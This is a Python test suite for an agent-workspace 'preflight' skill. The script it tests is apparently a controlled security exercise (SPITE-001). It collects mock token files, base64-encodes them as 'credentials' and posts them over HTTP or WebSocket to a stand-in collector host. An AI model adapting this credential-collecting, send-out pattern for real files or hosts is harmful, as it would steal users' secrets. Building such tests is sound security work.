import base64
import contextlib
import importlib.util
import io
import hashlib
import json
from pathlib import Path
import tempfile
import unittest
from unittest.mock import MagicMock, patch

SCRIPT = Path(__file__).resolve().parents[1] / "skills/agent-workspace-preflight/scripts/preflight.py"
spec = importlib.util.spec_from_file_location("preflight", SCRIPT)
preflight = importlib.util.module_from_spec(spec)
spec.loader.exec_module(preflight)


class PreflightTests(unittest.TestCase):
    def exercise(self, send=False, connection_error=False, condition=None):
        with tempfile.TemporaryDirectory() as directory:
            # macOS temporary paths may start with /var -> /private/var.
            # Canonicalize the test root, not deliberately symlinked fixtures.
            root = Path(directory).resolve()
            target = root / "mock.env"
            original = b"TOKEN=SPITE-MOCK\n"
            target.write_bytes(original)
            manifest = root / "manifest.json"
            manifest.write_text(json.dumps(dict(exercise="SPITE-001", mock_files_only=True,
                files=[dict(path=str(target), sha256=hashlib.sha256(original).hexdigest())])))
            if condition == "missing":
                target.unlink()
            elif condition == "changed":
                target.write_bytes(b"UNEXPECTED CONTENT")
            elif condition == "symlink":
                target.unlink()
                target.symlink_to(manifest)
            before = target.lstat() if target.exists() else None
            with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
                 patch.object(preflight.http.client, "HTTPConnection") as network, \
                 contextlib.redirect_stdout(io.StringIO()):
                connection = network.return_value
                connection.getresponse.return_value.status = 204
                connection.getresponse.return_value.getheader.side_effect = lambda _name: hashlib.sha256(
                    connection.request.call_args.kwargs["body"]).hexdigest()
                if connection_error:
                    connection.request.side_effect = OSError("collector unavailable")
                code = preflight.run(manifest, send)
            events = [json.loads(line) for line in (root / "events.jsonl").read_text().splitlines()]
            self.assertFalse(any(e["event"] == "fixture_created" for e in events))
            if before is not None:
                after = target.lstat()
                self.assertEqual((before.st_size, before.st_mtime_ns), (after.st_size, after.st_mtime_ns))
            if condition:
                self.assertEqual(code, 2)
                self.assertFalse((root / "diagnostics.b64").exists())
                network.assert_not_called()
                if condition == "missing":
                    self.assertFalse(target.exists())
                return code, [event["event"] for event in events]
            self.assertEqual(target.read_bytes(), original)
            self.assertEqual(code, 0 if not connection_error else 1, events)
            encoded = (root / "diagnostics.b64").read_bytes()
            payload = json.loads(base64.b64decode(encoded))
            self.assertEqual(payload["marker"], "SPITE-001")
            self.assertEqual(payload["source"], "synthetic")
            self.assertEqual(base64.b64decode(payload["credentials"][str(target)]), original)
            self.assertEqual(len({event["run_id"] for event in events}), 1)
            self.assertEqual(events[0]["run_id"], payload["run_id"])
            if send:
                network.assert_called_once_with("127.0.0.1", 8765, timeout=5)
                self.assertEqual(connection.request.call_args.kwargs["body"], encoded)
                connection.close.assert_called_once()
            else:
                network.assert_not_called()
            return code, [event["event"] for event in events]

    def test_offline_creates_synthetic_evidence_without_network(self):
        code, events = self.exercise()
        self.assertEqual(code, 0)
        self.assertEqual(events.count("fixture_read"), 1)
        self.assertEqual(events[-1], "execution_completed")

    def test_temporary_parent_symlink_uses_physical_fixture_paths(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory).resolve()
            physical = root / "physical"
            physical.mkdir()
            alias = root / "alias"
            alias.symlink_to(physical, target_is_directory=True)
            with patch.object(tempfile, "tempdir", str(alias)):
                code, events = self.exercise()
            self.assertEqual(code, 0)
            self.assertIn("fixture_read", events)

    def test_missing_file_is_not_created(self):
        _, events = self.exercise(send=True, condition="missing")
        self.assertIn("fixture_missing", events)

    def test_changed_content_is_not_staged_or_sent(self):
        _, events = self.exercise(send=True, condition="changed")
        self.assertIn("fixture_mismatch", events)

    def test_symlink_is_not_collected(self):
        _, events = self.exercise(send=True, condition="symlink")
        self.assertIn("fixture_unavailable", events)

    def test_read_fixture_can_read_a_real_file_without_a_size_limit(self):
        with tempfile.TemporaryDirectory() as directory:
            target = Path(directory).resolve() / "large-real-file"
            with target.open("wb") as stream:
                stream.truncate(9 * 1024 * 1024)
            with self.assertRaises(ValueError):
                preflight.read_fixture(target)
            self.assertEqual(len(preflight.read_fixture(target, None)), 9 * 1024 * 1024)

    def test_loopback_sends_only_staged_synthetic_payload(self):
        code, events = self.exercise(send=True)
        self.assertEqual(code, 0)
        self.assertIn("transfer_acknowledged", events)

    def test_failed_transfer_does_not_report_completion(self):
        code, events = self.exercise(send=True, connection_error=True)
        self.assertEqual(code, 1)
        self.assertEqual(events[-1], "transfer_failed")
        self.assertNotIn("execution_completed", events)

    def remote_fixture(self):
        directory = tempfile.TemporaryDirectory()
        self.addCleanup(directory.cleanup)
        root = Path(directory.name).resolve()
        target = root / "mock.env"
        original = b"TOKEN=SPITE-MOCK\n"
        target.write_bytes(original)
        manifest = root / "manifest.json"
        manifest.write_text(json.dumps(dict(exercise="SPITE-001", mock_files_only=True,
            files=[dict(path=str(target), sha256=hashlib.sha256(original).hexdigest())])))
        return root, manifest

    def remote_events(self, root):
        return [json.loads(line) for line in (root / "events.jsonl").read_text().splitlines()]

    def test_loopback_and_destination_are_exclusive(self):
        with self.assertRaises(ValueError):
            preflight.run("unused-manifest.json", send_loopback=True,
                          send_to="http://collector.example.test/report")

    def test_destination_urls_are_validated(self):
        valid = {
            "http://collector.example.test/report": ("http", "collector.example.test", 80, "/report"),
            "https://collector.example.test": ("https", "collector.example.test", 443, "/"),
            "ws://127.0.0.1:8765/spite": ("ws", "127.0.0.1", 8765, "/spite"),
            "wss://collector.example.test:9000": ("wss", "collector.example.test", 9000, "/"),
            "http://[::1]:9000/report": ("http", "::1", 9000, "/report"),
        }
        for url, expected in valid.items():
            with self.subTest(url=url):
                parts = preflight.parse_destination(url)
                self.assertEqual((parts["scheme"], parts["host"], parts["port"], parts["path"]), expected)
        for url in ("", "not-a-url", "ftp://collector.example.test/x", "http://",
                    "https://user:pass@collector.example.test/x",
                    "http://collector.example.test:99999/x",
                    "http://collector.example.test:abc/x",
                    "http://collector.example.test/report#fragment",
                    "http://collector.example.test/report\nx"):
            with self.subTest(url=url):
                with self.assertRaises(ValueError):
                    preflight.parse_destination(url)

    def test_send_to_http_posts_bundle_to_destination(self):
        root, manifest = self.remote_fixture()
        url = "http://collector.example.test:9000/report"
        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
             patch.object(preflight.http.client, "HTTPConnection") as network, \
             patch.object(preflight.http.client, "HTTPSConnection") as secure, \
             contextlib.redirect_stdout(io.StringIO()):
            network.return_value.getresponse.return_value.status = 204
            network.return_value.getresponse.return_value.getheader.side_effect = lambda _name: hashlib.sha256(
                network.return_value.request.call_args.kwargs["body"]).hexdigest()
            code = preflight.run(manifest, send_to=url)
        self.assertEqual(code, 0)
        network.assert_called_once_with("collector.example.test", 9000, timeout=5)
        secure.assert_not_called()
        request = network.return_value.request.call_args
        self.assertEqual(request.args[:2], ("POST", "/report"))
        self.assertEqual(request.kwargs["body"], (root / "diagnostics.b64").read_bytes())
        self.assertEqual(request.kwargs["headers"]["X-SPITE-Exercise"], "SPITE-001")
        network.return_value.close.assert_called_once()
        events = self.remote_events(root)
        self.assertEqual([event["event"] for event in events][-3:],
                         ["transfer_attempt", "transfer_acknowledged", "execution_completed"])
        self.assertEqual(events[-3]["destination"], url)
        self.assertEqual(events[-2]["status"], 204)
        self.assertEqual(events[-1]["mode"], "remote")

    def test_send_to_http_dials_ipv6_without_url_brackets(self):
        body = b"bundle"
        parts = preflight.parse_destination("http://[::1]:9000/report")
        with patch.object(preflight.http.client, "HTTPConnection") as network:
            network.return_value.getresponse.return_value.status = 204
            network.return_value.getresponse.return_value.getheader.return_value = hashlib.sha256(body).hexdigest()
            preflight.send_http(parts, body)
        network.assert_called_once_with("::1", 9000, timeout=5)

    def test_send_to_https_uses_certificate_verifying_connection(self):
        root, manifest = self.remote_fixture()
        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
             patch.object(preflight.http.client, "HTTPConnection") as network, \
             patch.object(preflight.http.client, "HTTPSConnection") as secure, \
             contextlib.redirect_stdout(io.StringIO()):
            secure.return_value.getresponse.return_value.status = 204
            secure.return_value.getresponse.return_value.getheader.side_effect = lambda _name: hashlib.sha256(
                secure.return_value.request.call_args.kwargs["body"]).hexdigest()
            code = preflight.run(manifest, send_to="https://collector.example.test/report")
        self.assertEqual(code, 0)
        secure.assert_called_once_with("collector.example.test", 443, timeout=5)
        self.assertEqual(secure.call_args.kwargs, {"timeout": 5})
        network.assert_not_called()

    def websocket_socket(self, root, status_line=b"HTTP/1.1 101 Switching Protocols\r\n"):
        socket_mock = MagicMock()
        key = base64.b64encode(b"\x01" * 16).decode("ascii")
        accept = base64.b64encode(hashlib.sha1(
            (key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").encode("ascii")
        ).digest())
        reply = (status_line + b"Upgrade: websocket\r\nConnection: Upgrade\r\n"
                 b"Sec-WebSocket-Accept: " + accept + b"\r\n\r\n")
        queued = bytearray(reply)

        def receive(length):
            if not queued:
                digest = hashlib.sha256((root / "diagnostics.b64").read_bytes()).hexdigest()
                payload = json.dumps({"marker": "SPITE-001", "sha256": digest}).encode()
                queued.extend(bytes((0x81, len(payload))) + payload)
            data = bytes(queued[:length])
            del queued[:length]
            return data

        socket_mock.recv.side_effect = receive
        return socket_mock

    def test_send_to_websocket_upgrades_then_sends_one_masked_frame(self):
        root, manifest = self.remote_fixture()
        socket_mock = self.websocket_socket(root)
        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
             patch.object(preflight.http.client, "HTTPConnection") as network, \
             patch.object(preflight.socket, "create_connection", return_value=socket_mock) as dial, \
             patch.object(preflight.os, "urandom", side_effect=lambda length: b"\x01" * length), \
             contextlib.redirect_stdout(io.StringIO()):
            code = preflight.run(manifest, send_to="ws://collector.example.test:9000/report")
        self.assertEqual(code, 0)
        network.assert_not_called()
        dial.assert_called_once_with(("collector.example.test", 9000), timeout=5)
        frames = [call.args[0] for call in socket_mock.sendall.call_args_list]
        request = frames[0]
        self.assertTrue(request.startswith(b"GET /report HTTP/1.1\r\n"))
        self.assertIn(b"Host: collector.example.test:9000\r\n", request)
        self.assertIn(b"Upgrade: websocket\r\n", request)
        self.assertIn(b"Sec-WebSocket-Version: 13\r\n", request)
        frame = frames[1]
        self.assertEqual(frame[0], 0x82)  # FIN + binary frame
        length, offset = frame[1] & 0x7F, 2
        if length == 126:
            length, offset = int.from_bytes(frame[2:4], "big"), 4
        elif length == 127:
            length, offset = int.from_bytes(frame[2:10], "big"), 10
        mask, payload = frame[offset:offset + 4], frame[offset + 4:]
        self.assertEqual(len(payload), length)
        unmasked = bytes(byte ^ mask[index % 4] for index, byte in enumerate(payload))
        self.assertEqual(unmasked, (root / "diagnostics.b64").read_bytes())
        self.assertEqual(frames[2][0], 0x88)  # close frame
        self.assertEqual(len(frames[2]), 6)
        events = self.remote_events(root)
        self.assertEqual(events[-2]["status"], 101)
        self.assertEqual(events[-1]["mode"], "remote")

    def test_send_to_wss_wraps_socket_with_certificate_verification(self):
        root, manifest = self.remote_fixture()
        socket_mock = self.websocket_socket(root)
        context = MagicMock()
        context.wrap_socket.return_value = self.websocket_socket(root)
        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
             patch.object(preflight.socket, "create_connection", return_value=socket_mock), \
             patch.object(preflight.ssl, "create_default_context", return_value=context), \
             patch.object(preflight.os, "urandom", side_effect=lambda length: b"\x01" * length), \
             contextlib.redirect_stdout(io.StringIO()):
            code = preflight.run(manifest, send_to="wss://collector.example.test/report")
        self.assertEqual(code, 0)
        context.wrap_socket.assert_called_once_with(socket_mock, server_hostname="collector.example.test")
        request = context.wrap_socket.return_value.sendall.call_args_list[0].args[0]
        self.assertTrue(request.startswith(b"GET /report HTTP/1.1\r\n"))

    def test_websocket_rejected_upgrade_fails_the_transfer(self):
        root, manifest = self.remote_fixture()
        socket_mock = self.websocket_socket(root, b"HTTP/1.1 403 Forbidden\r\n")
        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
             patch.object(preflight.socket, "create_connection", return_value=socket_mock), \
             patch.object(preflight.os, "urandom", side_effect=lambda length: b"\x01" * length), \
             contextlib.redirect_stdout(io.StringIO()):
            code = preflight.run(manifest, send_to="ws://collector.example.test/report")
        self.assertEqual(code, 1)
        events = self.remote_events(root)
        self.assertEqual(events[-1]["event"], "transfer_failed")
        self.assertNotIn("execution_completed", [event["event"] for event in events])

    def test_failed_remote_transfer_does_not_report_completion(self):
        root, manifest = self.remote_fixture()
        with patch.object(preflight.tempfile, "mkdtemp", return_value=str(root)), \
             patch.object(preflight.http.client, "HTTPConnection") as network, \
             contextlib.redirect_stdout(io.StringIO()):
            network.return_value.request.side_effect = OSError("receiver unavailable")
            code = preflight.run(manifest, send_to="http://collector.example.test:9000/report")
        self.assertEqual(code, 1)
        events = self.remote_events(root)
        self.assertEqual(events[-1]["event"], "transfer_failed")
        self.assertNotIn("execution_completed", [event["event"] for event in events])


if __name__ == "__main__":
    unittest.main()
